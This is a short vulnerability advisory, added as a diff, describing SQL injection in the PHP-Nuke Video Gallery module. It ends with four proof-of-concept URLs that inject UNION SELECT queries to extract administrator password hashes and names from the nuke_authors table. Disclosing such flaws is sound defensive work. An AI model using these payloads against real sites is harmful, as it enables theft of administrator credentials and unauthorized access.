@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/10215/info
+
+Reportedly the PHP-Nuke Video Gallery module is affected by multiple SQL injection vulnerabilities. This is due to a failure of the application to properly sanitize user-supplied input prior to using it in an SQL query.
+
+These issues may allow a remote attacker to manipulate query logic, potentially leading to unauthorized access to sensitive information such as the administrator password hash or corruption of database data. SQL injection attacks may also potentially be used to exploit latent vulnerabilities in the underlying database implementation.
+
+http://www.example.com/modules.php?name=Video_Gallery&l_op=viewclip&clipid=-1%20UNION%20SELECT%20pwd%20FROM%20nuke_authors&catid=1
+http://www.example.com/modules.php?name=Video_Gallery&l_op=viewcat&catid=-1%20UNION%20SELECT%20pwd%20FROM%20nuke_authors
+http://www.example.com/modules.php?name=Video_Gallery&l_op=viewclip&clipid=-1%20UNION%20SELECT%20name%20FROM%20nuke_authors&catid=1
+http://www.example.com/modules.php?name=Video_Gallery&l_op=voteclip&clipid=-1%20UNION%20SELECT%20pwd%20FROM%20nuke_authors&catid=1
